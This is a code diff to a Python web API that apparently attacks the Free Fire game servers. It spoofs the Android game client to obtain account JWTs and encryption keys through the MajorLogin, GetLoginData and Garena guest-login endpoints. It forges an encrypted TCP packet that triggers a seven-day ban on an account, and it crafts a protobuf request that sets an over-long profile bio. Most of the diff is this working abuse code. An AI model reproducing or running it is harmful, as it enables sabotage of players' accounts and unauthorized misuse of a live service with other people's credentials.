-                    v = pget(p, 23) or AES_IV
-                    if isinstance(k, str): k = k.encode()
-                    if isinstance(v, str): v = v.encode()
+        # Step 3: MajorLogin
+        MajorLogin_headers = {
+            "Host": "loginbp.ggpolarbear.com",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)",
+            "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
+            "Content-Type": "application/octet-stream", "Expect": "100-continue",
+            "X-GA": "v1 1", "X-Unity-Version": "2018.4.11f1", "ReleaseVersion": "OB53"
+        }
+        r = requests.post("https://loginbp.ggpolarbear.com/MajorLogin", headers=MajorLogin_headers, data=enc_payload, timeout=15)
+        if not r.ok: return {"success": False, "message": f"MajorLogin HTTP {r.status_code}"}
 
-                if not tok: 
-                    last_error = f"Platform {pt}: Parse failed"
-                    continue
+        # Step 4: Parse MajorLogin response
+        dec = aes_dec(r.content)
+        raw_proto = dec if dec else r.content
+        p = proto_parse(raw_proto)
+        
+        tok, k, v = None, None, None
+        try:
+            from MajorLogin_res_pb2 import MajorLoginRes
+            res = MajorLoginRes()
+            res.ParseFromString(raw_proto)
+            if res.account_jwt: tok, k, v = res.account_jwt, bytes(res.key), bytes(res.iv)
+        except: pass
 
-                # Get nanosecond timestamp (field 21)
-                field_21_value = p.get(21)
-                if field_21_value:
-                    if isinstance(field_21_value, list): field_21_value = field_21_value[0]
-                    timetamp = int(field_21_value)
-                else:
-                    # Fallback to exp from JWT
-                    pl_jwt = decode_jwt(tok)
-                    exp = int(pl_jwt.get("exp", 0))
-                    timetamp = exp * 1_000_000_000
+        if not tok:
+            tok = pget(p, 8)
+            k = pget(p, 22) or AES_KEY
+            v = pget(p, 23) or AES_IV
+            if isinstance(k, str): k = k.encode()
+            if isinstance(v, str): v = v.encode()
+        if not tok: return {"success": False, "message": "Parse MajorLogin failed"}
 
-                # Step 4: GetLoginData
-                online_ip, online_port, _, _ = get_login_data(tok, open_id, access_token, pt)
+        # Timestamp
+        timetamp = 0
+        field_21 = p.get(21)
+        if field_21:
+            if isinstance(field_21, list): field_21 = field_21[0]
+            timetamp = int(field_21)
+        else:
+            pl_jwt = decode_jwt(tok)
+            timetamp = int(pl_jwt.get("exp", 0)) * 1_000_000_000
 
-                # Step 5: Build and send packet
-                pl_jwt = decode_jwt(tok)
-                account_id = int(pl_jwt.get("account_id", 0))
-                
-                packet = build_ban_packet(tok, account_id, timetamp, k, v)
-                if not packet:
-                    last_error = f"Platform {pt}: Build packet failed"
-                    continue
-                    
-                recv_len = send_packet_tcp(online_ip, online_port, packet)
-                
-                if recv_len > 0:
-                    return {
-                        "success": True,
-                        "account_id": account_id,
-                        "nickname": pl_jwt.get("nickname"),
-                        "platform": pt,
-                        "msg": "Lệnh Ban 7 Ngày đã được thực thi thành công!"
-                    }
-                else:
-                    last_error = f"Platform {pt}: Không nhận được phản hồi từ server game"
-                    continue
+        # Step 5: GetLoginData (Manual)
+        GetLoginData_headers = {
+            'Expect': '100-continue', 'Authorization': f'Bearer {tok}',
+            'X-Unity-Version': '2018.4.11f1', 'X-GA': 'v1 1', 'ReleaseVersion': 'OB53',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)',
+            'Host': 'clientbp.ggpolarbear.com', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate, br',
+        }
+        r2 = requests.post("https://clientbp.ggpolarbear.com/GetLoginData", headers=GetLoginData_headers, data=enc_payload, timeout=15)
+        if r2.status_code != 200: return {"success": False, "message": f"GetLoginData HTTP {r2.status_code}"}
+        
+        # Step 6: Parse Game Server
+        p_login = get_available_room_local(r2.content)
+        if not p_login or '14' not in p_login: return {"success": False, "message": "Game Server not found"}
+        online_address = p_login['14']['data']
+        lc = online_address.rfind(':')
+        online_ip, online_port = online_address[:lc], int(online_address[lc+1:])
 
-            except Exception as e:
-                last_error = f"Platform {pt}: {str(e)}"
-                continue
-                
-        return {"success": False, "message": last_error}
+        # Step 7: Build and Send Packet
+        pl_jwt = decode_jwt(tok)
+        account_id = int(pl_jwt.get("account_id", 0))
+        
+        def encrypt_packet_local(hex_string, aes_key, aes_iv):
+            data_bytes = bytes.fromhex(hex_string)
+            cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
+            return cipher.encrypt(pad(data_bytes, AES.block_size)).hex()
+
+        encrypted_hex = encrypt_packet_local(tok.encode().hex(), k, v)
+        head_len = hex(len(encrypted_hex) // 2)[2:]
+        ide_hex = hex(account_id)[2:]
+        zeros = "0" * (16 - len(ide_hex))
+        timestamp_hex = hex(timetamp)[2:]
+        if len(timestamp_hex) % 2 != 0: timestamp_hex = '0' + timestamp_hex
+        
+        final_packet = bytes.fromhex(f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len}" + encrypted_hex)
+        recv_len = send_packet_tcp(online_ip, online_port, final_packet)
+        
+        if recv_len > 0:
+            return {"success": True, "account_id": account_id, "nickname": pl_jwt.get("nickname"), "msg": "Ban 7 Ngày thành công!"}
+        else:
+            return {"success": False, "message": "Không nhận được phản hồi từ Game Server"}
 
     except Exception as e:
         return {"success": False, "message": str(e)}
 
+
+
+def long_bio_logic(jwt_token, bio_text):
+    try:
+        # Build Protobuf Payload (Manual)
+        # Field 2: 17, Field 5: msg, Field 6: msg, Field 8: bio, Field 9: 1, Field 11: msg, Field 12: msg
+        pl = bytearray()
+        pl += vf(2, 17)
+        pl += sf(5, b'')
+        pl += sf(6, b'')
+        pl += sf(8, bio_text)
+        pl += vf(9, 1)
+        pl += sf(11, b'')
+        pl += sf(12, b'')
+        
+        # Encrypt
+        encrypted = aes_enc(bytes(pl))
+        
+        # Request
+        headers = {
+            "Expect": "100-continue",
+            "X-Unity-Version": "2018.4.11f1",
+            "X-GA": "v1 1",
+            "ReleaseVersion": FF_VER,
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
+            "Connection": "Keep-Alive",
+            "Accept-Encoding": "gzip",
+            "Authorization": f"Bearer {jwt_token}"
+        }
+        
+        r = requests.post(
+            "https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo",
+            headers=headers,
+            data=encrypted,
+            timeout=20,
+            verify=True
+        )
+        
+        if r.status_code == 200:
+            return {"success": True, "msg": "Cập nhật Bio thành công!"}
+        elif r.status_code == 401:
+            return {"success": False, "msg": "JWT không hợp lệ hoặc đã hết hạn (401)"}
+        elif r.status_code == 500:
+            return {"success": False, "msg": "Tiểu sử quá dài Vui lòng rút ngắn"}
+        else:
+            return {"success": False, "msg": f"Lỗi từ server: {r.status_code}"}
+            
+    except Exception as e:
+        return {"success": False, "msg": str(e)}
 
 # ═══════════════════════════════════════
 # ROUTES
@@ -556,6 +800,46 @@ def api():
     d   = ji()
     act = d.get('action','')
     uid = d.get('uid')
+    
+    # ── LONG BIO ──
+    if act == 'long_bio':
+        jwt_token = d.get('jwt')
+        access_token = d.get('access_token')
+        uid_g = d.get('uid_guest')
+        pw_g = d.get('password')
+        bio_text = d.get('bio','')
+        
+        if not bio_text: return err('Bio text required')
+        
+        try:
+            # Step 1: Get JWT if not provided
+            if not jwt_token:
+                if access_token:
+                    tok, k, v, _, _ = get_jwt_from_access(access_token)
+                    jwt_token = tok
+                elif uid_g and pw_g:
+                    # Guest Login logic
+                    r_g = requests.post(
+                        "https://100067.connect.garena.com/oauth/token",
+                        data={'grant_type':'password','app_id':'100067','account':uid_g,'password':hashlib.md5(pw_g.encode()).hexdigest()},
+                        headers={'User-Agent':'GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)','Content-Type':'application/x-www-form-urlencoded'},
+                        timeout=12
+                    )
+                    j_g = r_g.json()
+                    op_id = j_g.get('open_id'); at_g = j_g.get('access_token')
+                    if not op_id or not at_g: return err(f'Guest login thất bại: {r_g.text}')
+                    tok, k, v = major_login(op_id, at_g, 4)
+                    jwt_token = tok
+            
+            if not jwt_token: return err('JWT, Access Token, hoặc UID/Pass required')
+            
+            res = long_bio_logic(jwt_token, bio_text)
+            if res.get('success'):
+                return ok(None, res['msg'])
+            else:
+                return err(res.get('msg', 'Thất bại'))
+        except Exception as e:
+            return err(str(e))
 
     # ── BAN 7 DAYS ──
     if act == 'ban7':
@@ -895,7 +1179,7 @@ def api():
                     'ReleaseVersion':'OB53',
                     'Content-Type':'application/x-www-form-urlencoded'
                 },
-                data=bytes.fromhex(phex), verify=False, allow_redirects=False, timeout=12
+                data=bytes.fromhex(phex), verify=True, allow_redirects=False, timeout=12
             )
             if r.status_code != 200: return err(f'HTTP {r.status_code}')
             p = proto_parse(r.content)
